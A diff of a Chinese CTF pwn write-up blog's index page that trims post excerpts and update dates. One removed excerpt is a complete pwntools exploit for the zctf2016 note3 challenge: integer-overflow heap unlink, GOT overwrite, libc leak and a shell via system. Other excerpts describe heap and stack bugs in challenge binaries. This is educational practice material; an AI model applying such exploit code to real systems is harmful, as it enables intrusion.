@@ -214,13 +214,6 @@
 
               <time title="创建时间：2020-04-17 21:18:00" itemprop="dateCreated datePublished" datetime="2020-04-17T21:18:00+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-20 22:22:53" itemprop="dateModified" datetime="2025-06-20T22:22:53+08:00">2025-06-20</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -245,10 +238,6 @@
           <p>首先检查一下程序的保护机制</p>
 <img src="/2020/04/17/zctf2016-note3/1.png" class title="1.png">
 <p>然后用IDA分析一下,edit里存在一个整数溢出导致堆溢出的漏洞。当输入为0x8000000000000000时，即可使得index为-1，由于输入的长度不够，因此将0x8000000000000000转为负数的形式输入进去即可。然后就是正常的unlink了。</p>
-<img src="/2020/04/17/zctf2016-note3/2.png" class title="2.png">
-
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./zctf_2016_note3&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29603</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./zctf_2016_note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_0_ptr_addr = <span class="number">0x00000000006020C8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;(less than 1024)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;content:&#x27;</span>,content[<span class="number">0</span>:size-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#让heaps[-1]为heaps[0]</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#现在，通过让index为-1，就可以溢出chunk0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">payload += p64(heap_0_ptr_addr - <span class="number">0x18</span>) + p64(heap_0_ptr_addr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span> + p64(free_got) + p64(atoi_got) *<span class="number">2</span></span><br><span class="line">payload = payload.ljust(<span class="number">80</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)*<span class="number">3</span></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) * <span class="number">3</span> + p64(free_got) + p64(atoi_got) *<span class="number">2</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">atoi_addr = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改atoi的got表为system地址</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/zctf2016-note3/#more" rel="contents">
@@ -301,13 +290,6 @@
 
               <time title="创建时间：2020-04-17 21:10:00" itemprop="dateCreated datePublished" datetime="2020-04-17T21:10:00+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-20 21:43:03" itemprop="dateModified" datetime="2025-06-20T21:43:03+08:00">2025-06-20</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -332,9 +314,6 @@
           <p>首先，检查一下程序的保护机制</p>
 <img src="/2020/04/17/zctf2016-note2/1.png" class title="1.png">
 <p>然后用IDA分析一下，在edit函数里存在一个溢出漏洞，我们只需要让v6-strlen(&amp;dest) &#x3D;&#x3D; 0，即可绕过’\0’的截断，实现溢出。因此我们只需add(0,’’)，即可利用这个chunk来溢出，由于PIE也没开启并且堆指针保存在bss段，因此做unsorted bin unlink比较简单。</p>
-<img src="/2020/04/17/zctf2016-note2/2.png" class title="2.png">
-
-<p><strong>需要注意的是由于使用了strcpy函数，因此，我们布置64位数据时，必须从最后一个开始，前面用正常不截断的字符填充，逐步向前来布置多个64位数据。</strong></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/zctf2016-note2/#more" rel="contents">
@@ -387,13 +366,6 @@
 
               <time title="创建时间：2020-04-17 20:54:11" itemprop="dateCreated datePublished" datetime="2020-04-17T20:54:11+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-25 17:01:18" itemprop="dateModified" datetime="2025-06-25T17:01:18+08:00">2025-06-25</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -419,9 +391,6 @@
 <img src="/2020/04/17/PicoCTF_2018_are_you_root/image1.png" class>
 
 <p>然后，我们用IDA分析一下，只要符合条件就可以显示flag，但是按照正常的逻辑是不能的。</p>
-<img src="/2020/04/17/PicoCTF_2018_are_you_root/image2.png" class>
-
-<p>Login时，会malloc一个堆，大小为0x10，并且偏移8处就是auth的验证码。但是login时，并没有初始化*(v7+8)处的值，使得它的值是前面的操作影响。而<strong>strdup函数，内部会malloc一个与字符串长度一样的堆，并把字符串拷贝进去。</strong></p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/PicoCTF_2018_are_you_root/#more" rel="contents">
@@ -474,13 +443,6 @@
 
               <time title="创建时间：2020-04-17 20:37:50" itemprop="dateCreated datePublished" datetime="2020-04-17T20:37:50+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-24 20:03:01" itemprop="dateModified" datetime="2025-06-24T20:03:01+08:00">2025-06-24</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -506,9 +468,6 @@
 <img src="/2020/04/17/bcloud_bctf_2016/image1.png" class>
 
 <p>然后，我们用IDA分析一下，主逻辑里面没有什么问题</p>
-<img src="/2020/04/17/bcloud_bctf_2016/image2.png" class>
-
-<p>漏洞点在于最开始的地方，输入name的时候，由于malloc是在输入之后，因此，v2处s的0截断字符会被覆盖为堆指针，从而strcpy的时候把堆指针的值也复制进去，造成了堆地址泄露。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/bcloud_bctf_2016/#more" rel="contents">
@@ -561,13 +520,6 @@
 
               <time title="创建时间：2020-04-17 20:37:50" itemprop="dateCreated datePublished" datetime="2020-04-17T20:37:50+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-24 20:23:08" itemprop="dateModified" datetime="2025-06-24T20:23:08+08:00">2025-06-24</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -593,8 +545,6 @@
 <img src="/2020/04/17/nsctf_online_2019_pwn1/image1.png" class>
 
 <p>然后，我们用IDA分析一下</p>
-<p>Edit功能里存在一个null off by one漏洞</p>
-<img src="/2020/04/17/nsctf_online_2019_pwn1/image2.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/nsctf_online_2019_pwn1/#more" rel="contents">
@@ -647,13 +597,6 @@
 
               <time title="创建时间：2020-04-17 20:24:11" itemprop="dateCreated datePublished" datetime="2020-04-17T20:24:11+08:00">2020-04-17</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-25 16:57:37" itemprop="dateModified" datetime="2025-06-25T16:57:37+08:00">2025-06-25</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -679,9 +622,6 @@
 <img src="/2020/04/17/0CTF_2016_warmup/image1.png" class>
 
 <p>然后，我们用IDA分析一下</p>
-<img src="/2020/04/17/0CTF_2016_warmup/image2.png" class>
-
-<p>漏洞很简单，存在一个栈溢出漏洞。难点就在于NX保护开启，不然我们可以布置shellcode。这个程序不依靠glibc，并且栈溢出尺寸太小，并且gadgets少的可怜。几乎不能造出execve的系统调用。查看程序，发现已经有read、write可以使用，如果我们再整出个open系统调用，就能读取文件了。由于栈溢出尺寸太小，因此要想使得eax的值为5，并且能同时调用syscall，不能完成。**[突破点就在于alarm函数了。alarm函数有一个特性，如果多次调用alarm，那么alarm就会返回前一个alarm开始到现在，还剩下多长时间。]{.mark}**比如，第一次alarm(10)，然后过来2s，我们又调用alarm(1234)，那么第二次的alarm返回值eax为10s-2s&#x3D;8s。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/17/0CTF_2016_warmup/#more" rel="contents">
@@ -734,13 +674,6 @@
 
               <time title="创建时间：2020-04-14 20:15:11" itemprop="dateCreated datePublished" datetime="2020-04-14T20:15:11+08:00">2020-04-14</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-25 16:54:58" itemprop="dateModified" datetime="2025-06-25T16:54:58+08:00">2025-06-25</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -765,9 +698,6 @@
           <p>这是DawgCTF 2020国际赛的一题，作为一血所得者，还是很高兴的。</p>
 <p>首先，检查一下程序的保护机制，发现没开PIE</p>
 <img src="/2020/04/14/DawgCTF2020_tiktok/image1.png" class>
-
-<p>然后，我们用IDA分析一下,import_song函数打开文件描述符，然后存储在路径的后面那个空间</p>
-<img src="/2020/04/14/DawgCTF2020_tiktok/image2.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/14/DawgCTF2020_tiktok/#more" rel="contents">
@@ -820,13 +750,6 @@
 
               <time title="创建时间：2020-04-09 11:56:50" itemprop="dateCreated datePublished" datetime="2020-04-09T11:56:50+08:00">2020-04-09</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-24 19:59:09" itemprop="dateModified" datetime="2025-06-24T19:59:09+08:00">2025-06-24</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -852,8 +775,6 @@
 <img src="/2020/04/09/ciscn_final_5/image1.png" class>
 
 <p>然后，我们用IDA分析一下</p>
-<p>程序将下标存储到了堆地址的低4位里</p>
-<img src="/2020/04/09/ciscn_final_5/image2.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/09/ciscn_final_5/#more" rel="contents">
@@ -906,13 +827,6 @@
 
               <time title="创建时间：2020-04-09 11:41:50" itemprop="dateCreated datePublished" datetime="2020-04-09T11:41:50+08:00">2020-04-09</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-24 19:55:37" itemprop="dateModified" datetime="2025-06-24T19:55:37+08:00">2025-06-24</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -937,9 +851,6 @@
           <p>给了我们两个二进制，分别为32位和64位，两个程序功能完全相同，有一个裁决程序，fork出这两个程序，并监听着它们的输出，如果两者输出不一样或者一方崩溃，则裁决程序就会kill掉它们两个。</p>
 <p>首先，我们检查一下程序的保护机制</p>
 <img src="/2020/04/09/qwb2019_STKOF/image1.png" class>
-
-<p>然后，我们用IDA分析一下，32位</p>
-<img src="/2020/04/09/qwb2019_STKOF/image2.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/09/qwb2019_STKOF/#more" rel="contents">
@@ -992,13 +903,6 @@
 
               <time title="创建时间：2020-04-09 11:27:50" itemprop="dateCreated datePublished" datetime="2020-04-09T11:27:50+08:00">2020-04-09</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-06-23 22:23:24" itemprop="dateModified" datetime="2025-06-23T22:23:24+08:00">2025-06-23</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -1024,8 +928,6 @@
 <img src="/2020/04/09/BJDCTF_2nd_secret/image1.png" class>
 
 <p>然后，我们用IDA分析一下</p>
-<p>是一个猜数游戏，数值全在代码里，但是有10000个，显然全部抠出来太慢了。</p>
-<img src="/2020/04/09/BJDCTF_2nd_secret/image2.png" class>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2020/04/09/BJDCTF_2nd_secret/#more" rel="contents">
